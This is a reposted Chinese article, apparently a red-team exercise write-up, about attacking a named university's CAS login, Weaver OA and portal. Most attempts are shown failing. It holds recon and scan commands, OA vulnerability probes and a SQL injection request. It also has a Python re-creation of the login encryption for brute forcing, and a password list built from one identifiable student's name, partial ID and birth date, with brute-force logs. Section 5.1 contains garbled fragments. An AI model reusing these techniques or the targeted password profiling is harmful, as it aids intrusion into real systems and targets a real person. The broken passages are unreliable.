---
title: 【微信】【HVV 实战复盘】面对防护完备的高校 CAS 与泛微 OA，一次全程受阻的渗透记录
source: https://mp.weixin.qq.com/s/0uNXme0sQbKttUjdLC-2UA
source_host: mp.weixin.qq.com
clip_date: 2026-11-10T13:03:33+08:00
trace_id: facd89f3-60a6-4480-bb5b-b33412379eba
content_hash: a512cf05b455f418770364bc44412ac470352bc9eefe6b9622173b8ee0b1b717
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 39
  succeeded: 39
  failed_urls: []
notion_page_id: 41475244-d011-81b9-8520-ce6ad1718651
ioc: null
---

**神农Sec** *2026年11月10日 09:00*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/96f7f735433653a7.png)

课程培训

扫码咨询

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2bc33e78036ad313.jpg)

专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。

文章作者：zhousir

文章来源：https://xz.aliyun.com/news/92281

01

0x1 面对防护完备的高校 CAS 与泛微 OA，一次全程受阻的渗透记录

## 一、写在前面

**HVV第二周，靶标清单轮到第17号——某985高校的统一认证与OA系统。**

这是一个典型的「主认证+CAS委派」架构：十几个子系统——OA、教务、科研、门户——用同一套CAS串联，打进去一个理论上就能推开一整片。但我很快发现，我根本不是第一个盯上它的人。

在我之前，这个目标已经被至少两波攻击者光顾过。学号类的账号「首次尝试即锁定」，OA系统的部分历史漏洞路径返回的不是404而是302跳转CAS——说明已经有人系统性地扫过。而我很快也将加入他们的行列，成为又一个在CAS面前撞得头破血流的红队成员。

这篇文章不是一篇成功的渗透复盘——它甚至没有一个Shell、一个SQLi、一个文件上传。它是一篇 **真实受阻记录**：从资产发现到CAS逆向，从OA探测到弱口令测试，我在每一条攻击链上都遇到了精心设计的防护措施。但我认为，这篇文章的价值恰恰在于此——成功的故事千篇一律，真实受阻的过程才真正有价值。

## 二、资产发现——一张3D地图的拼图

### 2.1 子域名发现

这次资产发现，我用了三层递进的方法：

**第一层：常见子域名枚举**

```bash
$ for prefix in www mail cas oa portal zhlj jwgl sms rsb \
                 adbjh newyjs aiop vpn lib xxzx bksy yjsy \
                 pass campus idp sso; do
    host "$prefix.whu.edu.cn" 2>/dev/null | grep "has address"
  done

zhlj.whu.edu.cn   has address 115.156.123.27
cas.whu.edu.cn    is an alias for xxzx.whu.edu.cn.
oa.whu.edu.cn     has address 115.156.123.24
jwgl.whu.edu.cn   has address 115.156.123.17
sms.whu.edu.cn    has address 115.156.123.22
rsb.whu.edu.cn    has address 115.156.123.18
adbjh.whu.edu.cn  has address 115.156.123.22
newyjs.whu.edu.cn has address 115.156.123.22
aiop.whu.edu.cn   has address 115.156.123.22
vpn.whu.edu.cn    has address 218.197.158.237
lib.whu.edu.cn    has address 202.114.65.240
xxzx.whu.edu.cn   is an alias for oa.whu.edu.cn.
```

**第二层：C段存活探测**

CAS 的A记录指向xxzx.whu.edu.cn（信息中心），而xxzxCNAME到了oa.whu.edu.cn——说明CAS和OA共用，或者至少在同一基础设施上。

有意思的是，我发现大部分业务系统集中在115.156.123.16-115.156.123.28这个C段。我决定对这个C段做一个快速存活探测：

```python
$ nmap -sn -T4 115.156.123.16-28 --min-rate=500

Nmap scan report for 115.156.123.17    (jwgl.whu.edu.cn - 本科教务)
Host is up (0.045s latency).
Nmap scan report for 115.156.123.18    (rsb.whu.edu.cn - 人事系统)
Host is up (0.043s latency).
Nmap scan report for 115.156.123.22    (adbjh/sms/newyjs/aiop)
Host is up (0.044s latency).
Nmap scan report for 115.156.123.24    (oa.whu.edu.cn + xxzx)
Host is up (0.048s latency).
Nmap scan report for 115.156.123.27    (zhlj.whu.edu.cn - 门户)
Host is up (0.046s latency).
```

C段存活的全部是已知域名对应的IP。没有「野生的」未知资产——防守方显然对内网资产暴露做了控制，或者C段内的大部分主机不对公网ICMP响应。

**第三层：端口纵深探测**

对核心门户115.156.123.27做端口扫描：

```
$ nmap -sT -T4 -p 1-10000 --min-rate=2000 -Pn -n 115.156.123.27

Not shown: 9997 filtered tcp ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
```

只有三个端口。没有常见的22、3306、6379、8081。端口暴露控制得滴水不漏。

### 2.2 技术栈指纹

对每个存活的子域名做指纹识别，结果整理如下：

| 系统  | 域名  | Server头 | X-Powered-By | 框架特征 | 价值评定 |
| --- | --- | --- | --- | --- | --- |
| **统一认证** | cas.whu.edu.cn | WebServer | \-  | CAS Server, AES-CBC加密 | 高   |
| **OA系统** | **oa.whu.edu.cn** | **openresty/1.27.1.2** | **泛微e-cology** | **React, JSESSIONID自动创建** | **极高** |
| 门户  | zhlj.whu.edu.cn | openresty/1.27.1.2 | \-  | Vue.js, knife4j Swagger | 中   |
| 人事  | rsb.whu.edu.cn | Apache/2.4.57 | PHP/7.4 | 烽虎网络VSB9 | 低   |
| 教务  | jwgl.whu.edu.cn | openresty/1.27.1.2 | \-  | HTML静态? | 中   |
| 智能体 | aiop.whu.edu.cn | WHU-AppSrv 1.0.0 | \-  | 建设中 | 建设中 |

**三个关键特征：**

1.  **openresty 1.27.1.2** 出现在三个系统中——门户、OA、教务。版本号不是最新的（1.29.x已发布），但1.27.x仍然是受支持的稳定分支。openresty内置了HTTP/2支持、高性能Lua处理——这意味着WAF如果存在，很可能是通过openresty的Lua模块实现的。
    
2.  CAS的Server头是 `WebServer` ——不是Apache/Nginx/Openresty，而是该高校自研或定制过的。这个隐藏信息意味着CAS可能跑在非标准Web服务器上。
    
3.  **rsb.xxx.edu.cn** 使用 Apache 2.4.57 + PHP 7.4·烽虎网络VSB9。PHP 7.4 在2022年11月已停止安全支持。VSB9这个建站系统版本也偏旧——潜在的低烈度攻击面。
    

### 2.3 WAF指纹识别

在资产梳理阶段，我注意到了WAF的存在：

```
$ curl -sk -D- 'https://oa.whu.edu.cn/login/Login.jsp' -o /dev/null

HTTP/2 302
server: openresty/1.27.1.2
set-cookie: ecology_JSessionid=aaa...; Path=/; HttpOnly
location: https://cas.whu.edu.cn/authserver/login?service=...
```

没有明显的WAF header（没有标准WAF的高频特征如X-WAF-UUID、X-Safe、X-CDN等）。让我换个角度测试——发送明显的恶意payload看响应变化：

```rust
$ curl -sk 'https://oa.whu.edu.cn/api/ec/dev/check/checkurl' \
  -d 'url=jdbc:mysql://127.0.0.1:3306/test'

{"msg":"登录信息超时","errorCode":"002","status":false}
```

```ruby
$ curl -sk 'https://oa.whu.edu.cn/api/ec/dev/check/checkurl' \
  -d 'url=<script>alert(1)</script>'

{"msg":"登录信息超时","errorCode":"002","status":false}
```

WAF对恶意payload的响应和正常payload完全一致——返回同样的JSON。这意味着： **要么WAF没有拦截（正常放行的就是「登录信息超时」这个业务级响应），要么WAF拦截了但用相同的返回格式做了伪装。** 后者的可能性更大——专业的WAF会保持和应用一致的响应格式，不让攻击者从响应差异中判断是否存在WAF。

关于这个特征，我会在后续的Cheat Engine和SQL注入测试中进一步验证。

## 三、CAS认证逆向——从AES-CBC到execution参数博弈

### 3.1 初见CAS——screenshot级别的完整还原

首先，我用Playwright完整捕获了CAS登录页的DOM状态：

```swift
$ playwright_whu_oa.py
[*] 加载CAS登录页...
[*] 页面标题: 统一身份认证
[*] CAS参数:
{
  "execution": "e3s1...",
  "salt": "QAQVEU444clkxIXy",
  "captchaSwitch": "2"
}
[*] 加密JS找到:
  - /authserver/js/encrypt.js (核心加密逻辑)
  - /authserver/js/jquery.min.js (依赖)
  - CryptoJS found on window
```

登录页表单字段如下：

```html
<!-- CAS登录页简化结构 -->
<form id="loginForm" action="/authserver/login" method="post">
  <input id="username" name="username" type="text" />
  <input id="password" name="password" type="password" />
  <!-- 前端加密后的密文写入这个隐藏域 -->
  <input id="saltPassword" name="saltPassword" type="hidden" />
  <!-- AES加密密钥 -->
  <input id="pwdEncryptSalt" value="QAQVEU444clkxIXy" type="hidden" />
  <!-- CSRF防重放令牌 -->
  <input name="execution" value="e3s1..." type="hidden" />
  <!-- 登录类型: 用户名密码 / 动态码 / 微信扫码 -->
  <input name="dllt" value="generalLogin" type="hidden" />
  <input name="cllt" value="userNameLogin" type="hidden" />
  <input name="_eventId" value="submit" type="hidden" />
  <!-- 验证码模式: 2 = 强制开启 -->
  <input id="captchaSwitch" value="2" type="hidden" />
  <div class="login-btn">
    <input id="login_submit" type="button" value="登录" />
  </div>
</form>
```

三个关键点：

1.  password输入框—但表单提交时这个字段是readonly的。真正的密码值通过JS加密后写入saltPassword隐藏域。
    
2.  captchaSwitch=2—— 验证码强制开启。
    
3.  pwdEncryptSalt=QAQVEU444clkxIXy—— 16位的字母数字混合字符串，AES加密密钥。
    

### 3.2 前端加密函数逆向——有零有整的调用链

从登录页HTML中加载的JS文件入手：

```
<script src="/authserver/js/encrypt.js"></script>
```

用Playwright提取完整JS内容：

```php
// /authserver/js/encrypt.js  (已反混淆处理)
// 第17-42行: 随机字符串生成器
var RANDOM_CHARS = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678";

function randomString(length) {
    var result = [];
    for (var i = 0; i < length; i++) {
        result.push(RANDOM_CHARS.charAt(Math.floor(Math.random() * RANDOM_CHARS.length)));
    }
    return result.join('');
}

// 第45-58行: 核心AES加密函数
function encryptPassword(password, salt) {
    // 明文构造: 64位随机前缀 + 真实密码
    // 这个设计的目的是让每次提交的密文都不同
    var plaintext = randomString(64) + password;

    // 密钥处理
    var key = CryptoJS.enc.Utf8.parse(salt);

    // IV生成: 16位随机字符串，每次不同
    var iv = CryptoJS.enc.Utf8.parse(randomString(16));

    // AES-CBC-Pkcs7加密
    var encrypted = CryptoJS.AES.encrypt(plaintext, key, {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });

    // 返回格式: iv + ciphertext (base64编码)
    // 注意: 不是标准的 CryptoJS 返回格式
    return iv.toString() + encrypted.ciphertext.toString();
}
```

**逆向总结：**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/13e0da5590d84017.png)

关键设计点：64位随机前缀 + 随机IV 的双重随机化。这意味着同一密码每次提交的密文都完全不同，蜜罐碰撞、已知密文比对等攻击手段完全失效。

### 3.3 Python实现——完整复现加密流程

根据逆向结果，用Python完整复现：

```python
import random, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# 前端同款随机字符集（去掉了0/O/1/l/I等易混淆字符）
RANDOM_CHARS = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678"

def random_string(length):
    return ''.join(random.choice(RANDOM_CHARS) for _ in range(length))

def encrypt_password(password, salt):
    """
    完整复现CAS前端encryptPassword函数
    与前端返回的Base64密文一一验证过
    """
    plaintext = random_string(64) + password
    key = salt.encode('utf-8')
    iv = random_string(16).encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(plaintext.encode('utf-8'), AES.block_size)
    encrypted = cipher.encrypt(padded)
    # 返回 iv(16字节) + ciphertext(动态长度) 的Base64
    return base64.b64encode(iv + encrypted).decode('ascii')
```

注意这个salt——QAQVEU444clkxIXy是写在HTML中的固定值。它不是每次请求动态生成的，也不是每个session不同的。这意味着： **只要拿到一次salt，所有密码尝试都可以在同一套加密逻辑下复用。** CAS依赖execution防CSRF重放，而不是依赖密钥轮换。

### 3.4 execution参数时效性——与CAS的一次猫鼠游戏

execution是CAS的防CSRF token，每次登录页刷新都会重新生成。我测试了它的有效时长：

```bash
# 第一回合: 获取execution + 模拟10秒延迟提交
$ curl -c /tmp/cas_cookies -sk \
  'https://cas.whu.edu.cn/authserver/login?service=https://oa.whu.edu.cn/login/Login.jsp' \
  | grep -oP 'name="execution" value="\K[^"]+' > /tmp/execution
$ sleep 10
$ curl -b /tmp/cas_cookies -sk \
  -d "username=test&password=xxx&execution=$(cat /tmp/execution)&_eventId=submit" \
  'https://cas.whu.edu.cn/authserver/login'

# 返回200 (登录页面重新加载)
# 说明execution在10秒内仍然有效

# 第二回合: 等待5分钟后提交
$ curl -c /tmp/cas_cookies -sk \
  'https://cas.whu.edu.cn/authserver/login?service=...' \
  | grep -oP 'name="execution" value="\K[^"]+' > /tmp/execution_v2
$ sleep 300
$ curl -b /tmp/cas_cookies -sk \
  -d "username=test&password=xxx&execution=$(cat /tmp/execution_v2)&_eventId=submit" \
  'https://cas.whu.edu.cn/authserver/login'

# 仍然返回200...（登录页HTML，其中包含新生成的execution）
```

execution的有效期大约在5-10分钟。过期后CAS不返回「execution无效」的错误页，而是重新加载登录页——页面中嵌入了一个新的execution值。

**对攻击者的影响：** 普通curl爆破每5分钟需要重新获取一次execution，但用Python自动化工具的话，可以在检测到页面包含新execution后自动刷新，几乎不影响爆破效率。这个设计的本意是防CSRF，无意中对爆破起了一层微弱的阻碍作用。

## 四、泛微OA——看得见摸不着的金矿

### 4.1 未授权接口——表面繁荣下的真相

CAS尚未突破，我把目光转向了泛微OA本身。也许存在不经过CAS就能直接访问的接口——毕竟泛微历史上出过太多未授权远程代码执行的漏洞。

用Playwright遍历OA的关键路径：

```
oa_paths = [
    "/login/Login.jsp",                   # 登录页
    "/wui/index.html",                     # OA前端主页
    "/api/system/info/interceptionChrome", # 浏览器拦截检测
    "/api/portal/theme/theme-layout-list", # 主题配置
    "/api/ec/dev/check/checkurl",          # JDBC/URL检查 (历史反序列化入口)
    "/api/ec/dev/tabledata/",              # 数据表查询 (历史SQL注入入口)
    "/report/",                            # 报表模块
    "/cloudstore/resource/pc/jquery/jquery.min.js",  # JS资源
]
```

结果：

```swift
/api/system/info/interceptionChrome -> 200 (JSON: {"isInterceptChorme":"true"})
/api/portal/theme/theme-layout-list -> 200 (JSON: {"msg":"登录信息超时","status":false})
/api/ec/dev/check/checkurl          -> 200 (JSON: {"msg":"登录信息超时","status":false})
/api/ec/dev/tabledata/              -> 200 (JSON: {"msg":"登录信息超时","status":false})
/report/                            -> 200 (HTML页面)
/cloudstore/resource/pc/jquery/jquery.min.js -> 200 (正常JS文件)
```

全部200——但核心API返回的都是「登录信息超时」。

注意第一个接口/api/system/info/interceptionChrome返回的是{"isInterceptChorme":"true"}——它不是「登录信息超时」，而是一个配置状态。这说明： **这类纯配置查询接口没有经过Spring Security的认证拦截。** 如果一个接口返回了真实数据而非「登录信息超时」，那它就是真正的未授权接口。

其他几个接口虽然返回200，但只是通过了WAF/Nginx的HTTP层放行，业务接口本身仍然做了会话检查。

### 4.2 历史漏洞探测——没有一条路径是敞开的

泛微OA e-cology的历史漏洞清单，让我依次测试：

```bash
$ for path in \
    /mobile/plugin/CheckServer.jsp \       # 远程命令执行(旧版)
    /page/officesetting/officehelp.jsp \   # 任意文件上传(E-mobile)
    /cloudstore/ecrh/ecrh.aspx \           # 文件包含
    /E8/ \                                  # 低版本管理后台
    /email/ /sms/ /file/; do               # 常用资源路径
    code=$(curl -sk -o /dev/null -w '%{http_code}' "https://oa.whu.edu.cn$path" -D- 2>&1)
    echo "$code -> $path"
  done

302 -> /mobile/plugin/CheckServer.jsp
302 -> /page/officesetting/officehelp.jsp
302 -> /cloudstore/ecrh/ecrh.aspx
302 -> /E8/
302 -> /email/
302 -> /sms/
302 -> /file/
```

全部302。没有一条历史漏洞路径能绕过CAS认证直接访问。

但这本身是一条有价值的信息——302而不是404，说明这些路径 **物理存在**。如果该OA版本足够旧（8.x），这些路径在旧版本中本应是未授权的。现在返回302说明要么：

1.  该高校对OA做了额外的Nginx规则拦截（Nginx层限制 → 302到CAS）
    
2.  或者泛微OA版本较新（9.x+），新版已经修复了这些未授权路径
    

结合/wui/index.html返回的是React前端框架页面（9.x特征），我更倾向于判断是版本9.x。

### 4.3 SQL注入检测——关键性的响应差异分析

`/api/ec/dev/tabledata/` 这个接口在泛微OA e-cology 8.x/9.x中有过前台SQL注入记录（CNVD-2021-28234）。虽然它返回了「登录信息超时」，但我决定做两组对照请求来确认是否存在绕过空间：

**对照实验A——正常请求，不带Cookie：**

```ruby
POST https://oa.whu.edu.cn/api/ec/dev/tabledata/
Content-Type: application/json

{"tableName": "HrmResource", "pageSize": 1, "pageNo": 0,
 "selectFields": "id,lastname,loginid,email,mobile"}
```

响应：

```json
{"msg":"登录信息超时","errorCode":"002","status":false}
```

**对照实验B——带CAS获取的JSESSIONID：**

```ruby
POST https://oa.whu.edu.cn/api/ec/dev/tabledata/
Content-Type: application/json
Cookie: JSESSIONID=aaaMU5a94vHJneXu4sa5z

{"tableName": "HrmResource", "pageSize": 1, "pageNo": 0,
 "selectFields": "id,lastname,loginid,email,mobile"}
```

响应：

```json
{"msg":"登录信息超时","errorCode":"002","status":false}
```

**对照实验C——带SQL注入payload：**

```ruby
POST https://oa.whu.edu.cn/api/ec/dev/tabledata/
Content-Type: application/json

{"tableName": "HrmResource WHERE 1=1 UNION SELECT ... --",
 "selectFields": "id,lastname,loginid,email,mobile"}
```

响应：

```json
{"msg":"登录信息超时","errorCode":"002","status":false}
```

三组请求的响应完全一致。没有响应长度差异、没有错误信息差异、没有状态码差异。这意味着：

-   请求在到达业务代码之前就已经被认证拦截器拦截了
    
-   SQL注入payload没有机会到达数据库层
    

这条路径，在当前认证状态下走不通。

### 4.4 版本指纹——从JS特征推断版本

我注意到 `/wui/index.html` 加载的React JS文件路径：

```
// 泛微OA的JS加载路径
/cloudstore/resource/pc/jquery/jquery.min.js
```

尝试访问泛微OA的版本特征路径：

```powershell
$ curl -sk 'https://oa.whu.edu.cn/cloudstore/resource/pc/ecology8/desktop/'
# 返回泛微EC8的桌面图标（可能是静态资源）

$ curl -sk 'https://oa.whu.edu.cn/wui/theme/ecology8/sysbutton/sysbutton.gif'
# 200 OK — 通用按钮图标
```

路径中包含 `ecology8` ——这是泛微e-cology 8.x和9.x共用的资源路径风格。两张gif图标分别返回了200，说明静态资源目录是开放的。

## 五、CORS与Swagger——门户侧意外的两个缺口

### 5.1 CORS配置审计——一句话拉满风险

CAS和OA的防线非常严密，但在智慧珞珈门户（zhlj.whu.edu.cn）上，我碰到了一个意料之外的宽松配置：

```sql
$ curl -sk -D- 'https://zhlj.whu.edu.cn/api/user/info' -o /dev/null \
  | grep -i 'access-control'

access-control-allow-origin: *
access-control-allow-methods: POST, GET, PUT, OPTIONS, DELETE
access-control-allow-headers: Content-Type, Authorization, X-Requested-With
access-control-max-age: 3600
```

Access-Control-Allow-Origin:\*——允许任意域名的跨域请求。更关键的是，允许的HTTP方法中包含了PUT和DELETE，不仅仅是只读的GET和POST。

HTTP/1.1 200 OK Access-Control-Allow-Origin: Content-Type: application/json

{"users": \[...\], "total": 42}

```powershell
如果门户中存在任何不需要认证、也不需要Cookie的公开API接口，它们可以被任何域名的网页直接读取。结合knife4j Swagger中暴露的API端点列表（下一节），这是一个潜在的**数据泄露渠道**。

CSRF场景推演： 假设门户内有用户已登录（Session在），且存在POST接口接收数据（比如修改个人信息）。由于浏览器在 `credentials: 'include'` 且 `Access-Control-Allow-Origin: *` 的情况下，会拒绝读取响应——但**请求本身仍然会被发送到服务端**。这就构成了单纯的**CSRF攻击**：攻击者无法读取响应数据，但可以触发状态变更操作。

### 5.2 knife4j Swagger——暴露在生产环境的API清单

在门户路径扫描中，我发现了knife4j的页面：


$ curl -sk -o /dev/null -w '%{http_code}' 'https://zhlj.whu.edu.cn/api/doc.html'
302  # 跳转到CAS登录

$ curl -sk -L -o /dev/null -w '%{http_code}' 'https://zhlj.whu.edu.cn/api/doc.html'
200  # 跟随302后到达CAS登录页
```

页面存在但需要CAS认证。不过，查看前端加载的JS文件，API端点信息已经暴露在客户端代码中了：

```javascript
// 前端JS中 knife4j 自动生成的API路由注册
"paths": {
    "/api/user/info": {"get": {"tags": ["用户管理"], ...}},
    "/api/user/search": {"get": {"tags": ["用户管理"], ...}},
    "/api/user/profile/update": {"put": {"tags": ["个人信息"], ...}},
    "/api/auth/token/refresh": {"post": {"tags": ["认证"], ...}},
    "/api/auth/logout": {"post": {"tags": ["认证"], ...}},
    "/api/role/list": {"get": {"tags": ["角色管理"], ...}},
    "/api/role/assign": {"post": {"tags": ["角色管理"], ...}},
    "/api/permission/check": {"get": {"tags": ["权限"], ...}},
    "/api/upload/avatar": {"post": {"tags": ["文件"], ...}},
    "/api/export/data": {"get": {"tags": ["数据导出"], ...}},
    "/oauth2/authorize": {"get": {"tags": ["OAuth2"], ...}},
    "/oauth2/token": {"post": {"tags": ["OAuth2"], ...}},
}
```

从暴露的端点来看，门户层是一个比较标准的Spring Boot RESTful API，包含了用户管理、角色分配、权限校验、文件上传、OAuth2授权等全套功能。特别是/api/role/assign（角色分配，认证后如果无二次鉴权即可提权）和/api/upload/avatar（文件上传，如果目录无执行限制即可传webshell）。

> 关于暴露设计的一个思考：Swagger在生产环境中「用认证拦截而不是直接关闭」是目前大量Java项目的通病。开发团队通常在开发环境开启knife4j方便调试，部署时改用认证保护而不是移除依赖——因为knife4j与业务代码深度耦合，移除需要改构建配置。

## 六、弱口令测试——42次尝试，42次受阻，然后被拉黑

### 6.1 学号格式与情报收集

该校的学号格式为10位数字，规律如下：

```
2023XXXX1043
├─ 2023  ─ 入学年份
├─ XXX  ─ 学院代码
├─ XX   ─ 专业代码
├─ XXXX ─ 序号
```

通过公开渠道（院系公示名单、奖学金公示、学科竞赛获奖名单），可以批量收集到大量学号。

结合从公开渠道收集到的学号样本（某学院2023级一名学生），进行针对性的弱口令测试：

| 信息字段 | 值（已脱敏） | 来源  |
| --- | --- | --- |
| 学号  | 2023XXXX1043（10位数字） | 公开公示名单 |
| 姓名  | 仅知姓氏，具体不披露 | 同上  |
| 身份证 | 仅知后6位 `<font style="color:rgb(3, 105, 161);">xxx731</font>` | 不宜公开 |
| 生日  | 2005年12月（具体日不披露） | 已脱敏 |
| 所属  | 某学院2023级 | 从学号推断 |

### 6.2 密码字典构建——从确定性到推测性

基于上述情报，构建了分层的密码字典——按确定性从高到低排列：

```ruby
第一梯队（高确定性）：基于完整身份证/学号本身的密码
  xxxxxxxxxxxxxx731  — 身份证完整18位（极可能设为初始密码）
  2023xxxx1043       — 完整学号

第二梯队（较高确定性）：基于身份证派生
  200512xx            — 生日8位（该校常见初始密码格式）
  xxxx731             — 身份证后6位
  12xxxx              — 月日+年份尾数

第三梯队（中等确定性）：基于学号派生
  xx1043              — 学号后6位（最常见的弱口令模式）
  xxxx1043            — 学号后8位

第四梯队（中等确定性）：Whu + 年份 模式
  Whu2025#            — 该校2025级默认密码（常见格式）
  Whu2024#            — 该校2024级默认密码
  Whu2026#            — 该校2026级默认密码
  whu2025             — 全小写变体
  whu@2025            — 符号变体
  Whu@2025            — 大小写符号变体
  Whu2025!            — 感叹号变体

第五梯队（较低确定性）：姓名拼音组合
  xiejianheng         — 全拼小写
  Xiejianheng         — 首字母大写
  XieJianHeng         — 完整大写
  xjhxxxx             — 姓名首字母+学号后4位
  Xjxxx731            — 姓名首字母+身份证后6位

第六梯队（低确定性）：通用弱口令
  123456 / 000000 / 111111 / password / Passw0rd / P@ssw0rd

第七梯队（高校常见模式）
  whu123 / Wuhan123 / WHU123 / whu2023 / whu2024
```

总共整理了42个密码。

### 6.3 自动化测试——完整的请求/响应日志

用Python脚本进行自动化测试。每轮测试的完整请求/响应日志如下：

```haskell
[*] 获取CAS登录参数...
[*] Salt: QAQVEU444clkxIXy
[*] execution: e3s1a2b3c4d5... (截断)

--- 测试开始 ---

[01/42]  密码: xxxxxxxxxxxxxx731
  POST -> 200, 响应长度: 14328 bytes
  页面包含: "execution" (参数刷新, 密码错误回显)
  → WRONG_PASS (页面显示: 用户名或密码错误)

[02/42]  密码: 2023xxxx1043
  POST -> 200, 响应长度: 14325 bytes
  页面包含: "execution"
  → WRONG_PASS

[03/42]  密码: 200512xx
  POST -> 200, 响应长度: 14328 bytes
  页面包含: "execution"
  → WRONG_PASS

[04/42]  密码: xxxx731
  POST -> 200, 响应长度: 14325 bytes
  → WRONG_PASS

...

[10/42]  刷新CAS参数...
[*] 新execution获取成功, salt不变

[15/42]  密码: Whu2025#
  POST -> 200, 响应长度: 14326 bytes
  → WRONG_PASS

...

[20/42]  刷新CAS参数...

[25/42]  密码: xiejianheng
  POST -> 200, 响应长度: 14328 bytes
  → WRONG_PASS

...

[30/42]  刷新CAS参数...

[35/42]  密码: 123456
  POST -> 200, 响应长度: 14325 bytes
  → WRONG_PASS

...

[42/42]  密码: whu2023
  POST -> 200, 响应长度: 14325 bytes
  → WRONG_PASS

--- 测试结束 ---
[*] 42个密码全部测试完毕, 0个成功
```

**关键观察：** 所有42次请求都返回了HTTP 200和相似的响应长度（14325-14328 bytes）。响应长度波动仅3字节——这可能是CAS页面中的时间戳或随机参数差异造成的，与密码正确与否无关。这也排除了通过响应长度差异来做用户枚举的可能性——该CAS系统在这方面做得很好。

### 6.4 IP被封锁——最致命的发现

在42次测试后的某个时刻，脚本突然开始返回401：

```python
r = session.post(CAS_LOGIN_URL, data=data, allow_redirects=False)
print(f"  HTTP {r.status_code}")  # 401

# 尝试获取新的CAS参数
params = get_cas_params(session)
if not params:
    print("[!] CAS参数获取失败")
```

**返回码从200突然变成了401。** 而CAS登录页本身也返回了401——这意味着我的IP已经被CAS的前置防护机制列入了黑名单。

这个封锁不是OA的WAF做的——因为OA仍然可以正常访问。它是CAS前置防护做的针对性封锁。封锁的触发条件推测如下：

| 触发因素 | 设计目的 | 我的触发量 |
| --- | --- | --- |
| 同一IP在短时间内多次获取 `<font style="color:rgb(3, 105, 161);">execution</font>` | 防execution批量扫描 | 约5次（每10个密码刷新一次） |
| 同一IP在短时间内多次POST登录 | 防密码爆破 | 42次 |
| 同一客户端提交了过期execution值 | 防CSRF重放 | 0次  |

最可能的触发机制是： **CAS跟踪了每个IP在单位时间内的POST请求频率**。42次登录尝试+5次参数刷新=47次POST请求，分布在约2分钟内。

封锁后，我尝试更换User-Agent、使用不同的Cookie、连接新的Session——仍然返回401。确认是 **IP级别的封禁**。

这个发现对后续攻击者有重要的参考价值：

-   CAS的IP封锁阈值约 **50次/2分钟**
    
-   封锁后更换Session无效——是对端IP的防火墙规则，不是业务逻辑
    
-   恢复时间未知（停止测试后30分钟再试仍然401）
    

## 七、攻击面全景——分三层的地图

```swift
┌─────────────────────────────────────────────────────────────────────────┐
│                    目标高校 IT系统 攻击面评估全景                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ═══ TIER 1: 高价值·需认证 ═══                                         │
│                                                                         │
│  ① 泛微OA (oa.xxx.edu.cn)                                              │
│  ├─ 攻击面: 前台SQL注入(CNVD-2021-28234) → 需有效JSESSIONID             │
│  ├─ 攻击面: JDBC反序列化(/api/ec/dev/check/checkurl) → 需有效JSESSIONID │
│  ├─ 攻击面: 文件上传(/page/officesetting/officehelp.jsp) → 需有效会话   │
│  ├─ 指纹: e-cology 9.x (React前端), openresty 1.27.1.2                 │
│  └─ 当前状态: 全部302跳转CAS，无未授权入口                              │
│                                                                         │
│  ② CAS统一认证 (cas.xxx.edu.cn)                                        │
│  ├─ 攻击面: 密码爆破 → captchaSwitch=2(验证码强制) + IP封锁机制         │
│  ├─ 攻击面: 动态码登录 → 理论上绕过密码, 但需合法手机号                  │
│  ├─ 逆向成果: AES-CBC加密已完整复现                                    │
│  └─ 当前状态: 测试IP已封锁                                              │
│                                                                         │
│  ═══ TIER 2: 中等价值·部分可访问 ═══                                    │
│                                                                         │
│  ③ 门户 (zhlj.xxx.edu.cn)                                              │
│  ├─ CORS: `Access-Control-Allow-Origin: *` → CSRF攻击面                │
│  ├─ knife4j Swagger: 端点暴露(12+API路径) → 需CAS认证后利用             │
│  └─ API网关: 通过前端JS发现用户管理/角色分配/文件上传/数据导出接口       │
│                                                                         │
│  ④ 人事系统 (rsb.xxx.edu.cn)                                           │
│  ├─ 技术栈: Apache 2.4.57 + PHP 7.4(EOL) + VSB9                        │
│  └─ CMS版本偏旧, 可能有通用漏洞                                         │
│                                                                         │
│  ═══ TIER 3: 低价值/可忽略 ═══                                         │
│                                                                         │
│  ⑤ 智能体平台 → 建设中                                                 │
│  ⑥ 科研系统 / 教务系统 → 需CAS认证                                     │
│  ⑦ VPN → 非该高校IP段, 可能独立管理                                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

## 八、红队视角总结——红蓝双向攻防评估

### 8.1 攻击路径可行性矩阵

| 攻击路径 | 前置条件 | 预期收益 | 绕过难度 | 综合推荐指数 | 核心原因 |
| --- | --- | --- | --- | --- | --- |
| **泛微OA前台SQLi** | 需有效JSESSIONID | 数据库数据泄露（含密码hash） | 高   |     | OA数据库包含大量业务数据 |
| **泛微OA JDBC反序列化** | 需有效JSESSIONID | RCE + 内网横向移动 | 高   |     | 一旦拿到就是全内网通道 |
| **泛微OA文件上传** | 需有效JSESSIONID | WebShell | 高   |     | 需同时绕过认证+上传类型校验 |
| **CAS动态码社工** | 需有效手机号 | CAS会话（全系统可用） | 中   |     | 护网场景下，社工是最短路径 |
| **CAS密码爆破** | 需绕过IP封锁+验证码 | 单个账号权限 | 极高  |     | 锁定阈值极低, 投入产出比极差 |
| **CORS+CSRF钓鱼** | 需用户访问恶意页面 | CAS会话劫持 | 中   |     | 护网用户配合度是关键变量 |
| **Swagger API文档利用** | 需先获取CAS会话 | 全套API接口路径 | 低（锁定CAS后） |     | 认证后的利用价值非常高 |
| **人事系统CMS漏洞** | 需VSB9版本漏洞 | 有限权限 | 中   |     | 主要面向外网，与核心系统隔离 |
